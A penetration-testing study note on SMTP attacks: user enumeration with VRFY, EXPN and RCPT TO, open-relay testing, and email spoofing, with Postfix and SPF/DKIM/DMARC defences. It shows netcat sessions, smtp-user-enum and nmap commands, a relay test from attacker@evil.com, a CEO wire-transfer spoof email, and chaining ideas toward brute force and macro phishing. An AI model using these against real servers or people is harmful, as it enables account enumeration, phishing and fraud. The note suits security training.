---
tags: [smtp, mail, open-relay, spoofing, enumeration]
difficulty: beginner
module: "35 - Network Protocol Attacks"
topic: "35.04 SMTP"
---

# SMTP — Open Relay, User Enumeration (VRFY, EXPN), Spoofing

## 1. Introduction to SMTP
Simple Mail Transfer Protocol (SMTP) is the internet standard protocol for electronic mail transmission (RFC 5321). Mail servers use SMTP to send and receive mail messages, while user-level client mail applications typically use SMTP only for sending messages to a mail server for relaying.

By default, SMTP operates over:
- **Port 25:** Unencrypted default routing port. Often blocked by ISPs to prevent spam.
- **Port 587:** Used for encrypted (STARTTLS) client-to-server mail submission.
- **Port 465:** Deprecated, but still widely used for implicit SSL/TLS encrypted SMTP.

SMTP is fundamentally a text-based, cleartext protocol where the client issues commands (like `HELO`, `MAIL FROM`, `RCPT TO`, `DATA`) and the server replies with numeric status codes (e.g., `250 OK`, `550 No such user`).

### 1.1 The SMTP Conversation
A typical manual SMTP transaction looks like this:
```bash
$ nc 10.10.10.10 25
220 mail.example.com ESMTP Postfix
HELO client.com
250 mail.example.com
MAIL FROM:<sender@example.com>
250 2.1.0 Ok
RCPT TO:<victim@example.com>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Test Email
This is the body.
.
250 2.0.0 Ok: queued as 12345
QUIT
221 2.0.0 Bye
```

## 2. ASCII Diagram: SMTP Attack Surface

```text
    [Attacker]
        |
        |--(1) Enumeration (VRFY root, EXPN admins)
        |      Extracts valid usernames for SSH/FTP brute force.
        |
        |--(2) Open Relay Exploitation
        |      Routes spam/phishing through vulnerable server.
        |
        |--(3) Email Spoofing (Forged MAIL FROM / Header FROM)
        |      Bypasses weak SPF/DKIM checks to deliver phishing.
        V
    [SMTP Server (Port 25)]
        |
        |--> (Delivers payload to Internal Users)
        |
        |--> (Relays payload to External Internet targets)
```

## 3. User Enumeration (VRFY, EXPN, RCPT TO)
One of the primary reconnaissance techniques during a penetration test is enumerating valid user accounts on the target system. SMTP provides built-in commands that attackers abuse for this exact purpose.

### 3.1 The VRFY Command
The `VRFY` (Verify) command asks the server to confirm if a specific username or email address exists on the system.

**Exploitation:**
```bash
$ nc 10.10.10.10 25
VRFY root
250 root <root@example.com>     <-- User exists!
VRFY fakeuser
550 5.1.1 <fakeuser>: Recipient address rejected: User unknown
```

### 3.2 The EXPN Command
The `EXPN` (Expand) command asks the server to expand a mailing list or alias to show all the individual members. This can yield massive lists of valid user emails instantly.

**Exploitation:**
```bash
$ nc 10.10.10.10 25
EXPN developers
250-alice@example.com
250-bob@example.com
250 charlie@example.com
```

### 3.3 Enumeration via RCPT TO
Even if an administrator wisely disables `VRFY` and `EXPN`, an attacker can still enumerate users by attempting to start an email transaction using `RCPT TO`.

**Exploitation:**
```bash
MAIL FROM:<test@test.com>
250 OK
RCPT TO:<root@example.com>
250 OK  <-- User exists
RCPT TO:<fake@example.com>
550 User unknown  <-- User does not exist
```

**Automated Enumeration Tools:**
Attackers rarely do this manually. Tools like `smtp-user-enum` automate this against wordlists.
```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/names.txt -t 10.10.10.10
```

## 4. SMTP Open Relay Attacks
An Open Relay is an SMTP server configured in such a way that it allows anyone on the internet to send an email through it, destined for any other domain, without requiring authentication.

**The Mechanics:**
Historically, open relays were the default. But as spam became a massive issue, mail servers were locked down to only relay mail if:
1. The sender is authenticated.
2. The sender's IP is within the internal corporate network.
3. The destination email address belongs to a domain managed by the server itself.

If a server fails to enforce these rules, an attacker can use it to bounce massive spam campaigns or targeted phishing emails.

**The Risk:**
- **Blacklisting:** The organization's IP address will be quickly added to global DNS Blackhole Lists (DNSBLs) like Spamhaus. All legitimate outbound company email will bounce or go straight to junk folders.
- **Resource Exhaustion:** The server's bandwidth and disk space (mail queues) will be consumed by the attacker's traffic.

**Testing for Open Relay:**
```bash
$ nc 10.10.10.10 25
HELO test.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external-domain.com>  <-- Target is external
DATA
Subject: Open Relay Test
Test.
.
250 OK  <-- If the server accepts this, it is an Open Relay!
```
Nmap can also test this automatically:
```bash
nmap --script smtp-open-relay -p 25 10.10.10.10
```

## 5. Email Spoofing and Trust Exploitation
SMTP inherently performs no authentication on the "From" address. An attacker can connect to a server and claim to be anyone.

**The Mechanics:**
There are two "From" addresses in an email:
1. **Envelope From (MAIL FROM):** Used by the SMTP servers for routing and bounce messages (the Return-Path).
2. **Header From (`From:` inside the DATA block):** This is what the end-user actually sees in their email client (Outlook, Gmail).

An attacker can easily spoof both to perform sophisticated phishing attacks (e.g., impersonating the CEO instructing finance to wire money).

**Exploitation:**
```bash
MAIL FROM:<ceo@company.com>
RCPT TO:<finance@company.com>
DATA
From: "CEO John Doe" <ceo@company.com>
To: "Finance Team" <finance@company.com>
Subject: URGENT: Wire Transfer Required

Please process this invoice immediately.
.
```

## 6. Defensive Strategies & Mitigation

### 6.1 Securing SMTP Services
- **Disable VRFY and EXPN:** In Postfix, set `disable_vrfy_command = yes`.
- **Close Open Relays:** Configure strict relay access controls. Use `smtpd_recipient_restrictions` in Postfix to ensure `permit_mynetworks` and `permit_sasl_authenticated` are prioritized, followed by `reject_unauth_destination`.
- **Enforce STARTTLS:** Require all clients traversing port 587 to use TLS encryption, mitigating cleartext credential sniffing.

### 6.2 Anti-Spoofing Protocols (SPF, DKIM, DMARC)
To combat spoofing, modern email relies on three major DNS-based TXT record protocols:

- **SPF (Sender Policy Framework):** A DNS record that lists exactly which IP addresses are authorized to send mail on behalf of the domain. If an attacker spoofs the domain from their own rogue server, the receiving server will check the SPF record, see the IP mismatch, and flag it as spam.
- **DKIM (DomainKeys Identified Mail):** The sending server cryptographically signs the email headers and body. The receiving server fetches the domain's public key from DNS to verify the signature. This ensures the email was not tampered with in transit and genuinely originated from the claimed domain.
- **DMARC (Domain-based Message Authentication, Reporting, and Conformance):** Ties SPF and DKIM together. It instructs the receiving server on what to do if an email *fails* SPF or DKIM checks (e.g., `p=none` for monitoring, `p=quarantine` to send to spam, `p=reject` to drop it entirely).

Penetration testers always check a domain's DMARC records (`dig TXT _dmarc.example.com`). If it is missing or set to `p=none`, the domain is highly vulnerable to spoofing.

## 7. Chaining Opportunities
- **SMTP Enum to SSH/VPN Brute Force:** Use `smtp-user-enum` to build a valid list of active employee usernames, then feed that list into Hydra to brute force the corporate VPN or SSH gateway. -> [[02 - SSH — Brute Force, Weak Keys, Version Vulns]]
- **Spoofing to Client-Side Exploitation:** Leverage a missing DMARC record to perfectly spoof an internal IT alert, delivering a malicious macro-enabled Word document to compromise employee workstations. -> [[14 - Client-Side Attacks]]
- **Open Relay to Phishing C2:** Use a compromised internal open relay to bounce command-and-control emails, bypassing outbound firewall restrictions that only monitor HTTP/HTTPS traffic. -> [[20 - Command and Control (C2)]]

## 8. Related Notes
- [[05 - IMAP POP3 — Credential Attacks]]
- [[06 - DNS — Zone Transfer (AXFR), Cache Poisoning, Spoofing]]
- [[15 - Social Engineering]]

---
*End of Note*
